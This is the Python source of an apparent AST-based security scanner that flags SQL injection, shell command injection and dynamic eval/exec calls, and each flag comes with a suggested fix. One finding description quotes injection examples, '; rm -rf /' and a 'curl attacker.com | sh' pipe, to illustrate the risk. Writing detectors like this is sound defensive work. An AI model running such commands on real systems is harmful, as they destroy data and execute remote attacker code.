"""
Python AST-based security analyzer.

Detects:
  - SQL Injection via string concatenation / f-strings in DB execute calls
  - Command Injection via subprocess with shell=True + dynamic args
  - Command Injection via os.system() / os.popen() with dynamic args
  - Dangerous function usage: eval(), exec(), compile() with dynamic args

Uses the built-in `ast` module — no external dependencies required.
Taint tracking is provided by secara.taint.python_taint.PythonTaintTracker.
"""
from __future__ import annotations

import ast
import logging
from pathlib import Path
from typing import List, Union

from secara.detectors.base import BaseDetector
from secara.output.models import Finding
from secara.taint.python_taint import PythonTaintTracker, _is_taint_source

logger = logging.getLogger("secara.python")

FunctionNode = Union[ast.FunctionDef, ast.AsyncFunctionDef]

# ── SQL sink function names ───────────────────────────────────────────────────
_SQL_EXECUTE_ATTRS = {
    "execute", "executemany", "executescript", "raw", "query",
}

# ── Subprocess / OS sink function chains ─────────────────────────────────────
_SUBPROCESS_DANGEROUS = {
    "call", "run", "Popen", "check_output", "check_call", "getoutput",
}
_OS_DANGEROUS = {"system", "popen", "getoutput", "getstatusoutput"}

# ── Eval / exec sinks ────────────────────────────────────────────────────────
_EVAL_EXEC_NAMES = {"eval", "exec", "compile"}


def _is_dynamic_string(node: ast.expr, tainted: set[str]) -> bool:
    """
    Return True if *node* represents a non-literal (dynamic) string:
    - An f-string (JoinedStr) containing a non-constant value
    - A binary concatenation (BinOp +) involving a name/call
    - A %-formatted string with non-constant operands
    - A Name reference that is tainted
    - A Call result passed directly
    """
    if isinstance(node, ast.Name):
        return True  # any variable

    if isinstance(node, ast.JoinedStr):  # f-string
        return any(
            isinstance(v, ast.FormattedValue)
            for v in ast.walk(node)
        )

    if isinstance(node, ast.BinOp):
        # String concatenation (a + b) or %-format (a % b)
        if isinstance(node.op, (ast.Add, ast.Mod)):
            # If either side is non-literal, it's dynamic
            left_dynamic = not isinstance(node.left, ast.Constant)
            right_dynamic = not isinstance(node.right, ast.Constant)
            return left_dynamic or right_dynamic

    if isinstance(node, ast.Call):
        return True  # result of a function call is dynamic

    if isinstance(node, ast.Subscript):
        return True  # dict/list access is dynamic

    return False


def _extract_string_constant(node: ast.expr) -> str:
    """Best-effort extraction of a string constant from an AST node."""
    if isinstance(node, ast.Constant) and isinstance(node.value, str):
        return node.value
    return ""


def _looks_like_sql(text: str) -> bool:
    """Heuristic: does this string start with a SQL keyword?"""
    keywords = ("select", "insert", "update", "delete", "drop", "create",
                 "alter", "exec", "execute", "merge", "replace", "call")
    stripped = text.strip().lower()
    return any(stripped.startswith(k) for k in keywords)


class PythonAnalyzer(BaseDetector):
    """Full AST-based security analysis for Python files."""

    def analyze(self, file_path: Path, content: str) -> List[Finding]:
        findings: List[Finding] = []

        try:
            tree = ast.parse(content, filename=str(file_path))
        except SyntaxError as exc:
            logger.debug("Syntax error in %s: %s", file_path, exc)
            return findings

        lines = content.splitlines()

        # Walk all function definitions to enable per-function taint tracking
        for node in ast.walk(tree):
            if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
                tracker = PythonTaintTracker()
                tracker.scan_function(node)
                self._analyze_function(
                    file_path, node, tracker, lines, findings
                )

        # Also check bare module-level calls (scripts, not just functions)
        module_tracker = PythonTaintTracker()
        self._analyze_body(file_path, tree.body, module_tracker, lines, findings)

        # De-duplicate (same file + line + rule)
        seen = set()
        unique = []
        for f in findings:
            key = (f.file_path, f.line_number, f.rule_id)
            if key not in seen:
                seen.add(key)
                unique.append(f)

        return unique

    def _analyze_function(
        self,
        file_path: Path,
        func: FunctionNode,
        tracker: PythonTaintTracker,
        lines: list[str],
        findings: List[Finding],
    ) -> None:
        self._analyze_body(file_path, ast.walk(func), tracker, lines, findings)

    def _analyze_body(
        self,
        file_path: Path,
        nodes,
        tracker: PythonTaintTracker,
        lines: list[str],
        findings: List[Finding],
    ) -> None:
        for node in nodes:
            if not isinstance(node, ast.Call):
                continue

            # ── SQL Injection ──────────────────────────────────────────────
            finding = self._check_sql_injection(
                file_path, node, tracker, lines
            )
            if finding:
                findings.append(finding)

            # ── Command Injection ──────────────────────────────────────────
            finding = self._check_cmd_injection(
                file_path, node, tracker, lines
            )
            if finding:
                findings.append(finding)

            # ── eval / exec ────────────────────────────────────────────────
            finding = self._check_eval_exec(
                file_path, node, tracker, lines
            )
            if finding:
                findings.append(finding)

    # ── SQL Injection ─────────────────────────────────────────────────────────
    def _check_sql_injection(
        self,
        file_path: Path,
        call: ast.Call,
        tracker: PythonTaintTracker,
        lines: list[str],
    ) -> Finding | None:
        func = call.func
        if not (isinstance(func, ast.Attribute) and func.attr in _SQL_EXECUTE_ATTRS):
            return None

        if not call.args:
            return None

        first_arg = call.args[0]

        # Must be a dynamic string — not a literal constant
        if not _is_dynamic_string(first_arg, tracker.tainted_names):
            return None

        # Taint check: is the dynamic part user-controlled?
        # Accept even without taint tracking for direct string builds
        # (e.g., "SELECT * FROM users WHERE id=" + user_id) since the
        # construction itself is the vulnerability regardless of source.
        tainted = (
            tracker.is_arg_tainted(call)
            or self._arg_contains_tainted_name(first_arg, tracker.tainted_names)
        )

        # Optionally verify SQL content for higher confidence
        prefix_text = _extract_string_constant(
            first_arg.left if isinstance(first_arg, ast.BinOp) else first_arg
        )
        if prefix_text and not _looks_like_sql(prefix_text):
            return None  # Doesn't look like SQL, skip

        line_no = call.lineno
        return Finding(
            rule_id="SQL001",
            rule_name="SQL Injection via String Concatenation",
            severity="HIGH",
            file_path=str(file_path),
            line_number=line_no,
            snippet=self.get_snippet(lines, line_no),
            description=(
                "A database execute() call uses a dynamically built query string. "
                "String concatenation or formatting with user-controlled input in SQL "
                "queries allows attackers to inject arbitrary SQL, potentially "
                "bypassing authentication or exfiltrating the entire database."
            ),
            fix=(
                "Use parameterized queries (prepared statements) instead:\n"
                "  cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))\n"
                "Never build SQL strings with f-strings, %-formatting, or + concatenation."
            ),
            language="python",
        )

    def _arg_contains_tainted_name(
        self, node: ast.expr, tainted: set[str]
    ) -> bool:
        for n in ast.walk(node):
            if isinstance(n, ast.Name) and n.id in tainted:
                return True
        return False

    # ── Command Injection ─────────────────────────────────────────────────────
    def _check_cmd_injection(
        self,
        file_path: Path,
        call: ast.Call,
        tracker: PythonTaintTracker,
        lines: list[str],
    ) -> Finding | None:
        func = call.func
        line_no = call.lineno

        # ── os.system / os.popen ──────────────────────────────────────────
        if isinstance(func, ast.Attribute) and func.attr in _OS_DANGEROUS:
            chain = ""
            if isinstance(func.value, ast.Name):
                chain = func.value.id
            if chain == "os" and call.args:
                arg0 = call.args[0]
                if _is_dynamic_string(arg0, tracker.tainted_names):
                    return Finding(
                        rule_id="CMD001",
                        rule_name="Command Injection via os.system / os.popen",
                        severity="HIGH",
                        file_path=str(file_path),
                        line_number=line_no,
                        snippet=self.get_snippet(lines, line_no),
                        description=(
                            f"os.{func.attr}() is called with a dynamically constructed "
                            "command string. If any part of the string is user-controlled, "
                            "an attacker can inject arbitrary OS commands."
                        ),
                        fix=(
                            "Use subprocess.run() with a list of arguments "
                            "(NOT shell=True) and never interpolate user input into commands:\n"
                            "  subprocess.run(['ls', user_dir], capture_output=True)"
                        ),
                        language="python",
                    )

        # ── subprocess.call / run / Popen with shell=True ─────────────────
        if isinstance(func, ast.Attribute) and func.attr in _SUBPROCESS_DANGEROUS:
            chain = ""
            if isinstance(func.value, ast.Name):
                chain = func.value.id
            if chain == "subprocess":
                has_shell_true = self._has_keyword_true(call, "shell")
                if has_shell_true and call.args:
                    arg0 = call.args[0]
                    if _is_dynamic_string(arg0, tracker.tainted_names):
                        return Finding(
                            rule_id="CMD002",
                            rule_name="Command Injection via subprocess with shell=True",
                            severity="HIGH",
                            file_path=str(file_path),
                            line_number=line_no,
                            snippet=self.get_snippet(lines, line_no),
                            description=(
                                f"subprocess.{func.attr}() is called with shell=True and a "
                                "dynamic command string. This is equivalent to passing the command "
                                "to /bin/sh, enabling shell metacharacter injection "
                                "(e.g., ; rm -rf /, && curl attacker.com | sh)."
                            ),
                            fix=(
                                "Remove shell=True. Pass the command as a list to avoid shell expansion:\n"
                                "  subprocess.run(['cmd', arg1, arg2])  # safe\n"
                                "If shell=True is required, validate/sanitize input with shlex.quote()."
                            ),
                            language="python",
                        )

        return None

    def _has_keyword_true(self, call: ast.Call, keyword_name: str) -> bool:
        for kw in call.keywords:
            if kw.arg == keyword_name:
                if isinstance(kw.value, ast.Constant) and kw.value.value is True:
                    return True
        return False

    # ── eval / exec ───────────────────────────────────────────────────────────
    def _check_eval_exec(
        self,
        file_path: Path,
        call: ast.Call,
        tracker: PythonTaintTracker,
        lines: list[str],
    ) -> Finding | None:
        func = call.func
        if not (isinstance(func, ast.Name) and func.id in _EVAL_EXEC_NAMES):
            return None

        if not call.args:
            return None

        arg0 = call.args[0]

        # Literal constant → not a vulnerability (e.g., eval("2+2"))
        if isinstance(arg0, ast.Constant):
            return None

        line_no = call.lineno
        tainted = (
            tracker.is_arg_tainted(call)
            or self._arg_contains_tainted_name(arg0, tracker.tainted_names)
        )

        severity = "HIGH" if tainted else "MEDIUM"

        return Finding(
            rule_id="CMD003",
            rule_name=f"Dangerous Use of {func.id}()",
            severity=severity,
            file_path=str(file_path),
            line_number=line_no,
            snippet=self.get_snippet(lines, line_no),
            description=(
                f"{func.id}() is called with a non-constant argument"
                + (" derived from user input" if tainted else "") + ". "
                "eval() and exec() execute arbitrary Python code. "
                "If any user-controlled data reaches this call, attackers can "
                "execute arbitrary commands on the server."
            ),
            fix=(
                f"Avoid {func.id}() entirely. If you need dynamic behavior, use:\n"
                "  - ast.literal_eval() for safe evaluation of Python literals\n"
                "  - A dispatch dictionary (dict of callables) for dynamic dispatch\n"
                "  - importlib for dynamic imports"
            ),
            language="python",
        )
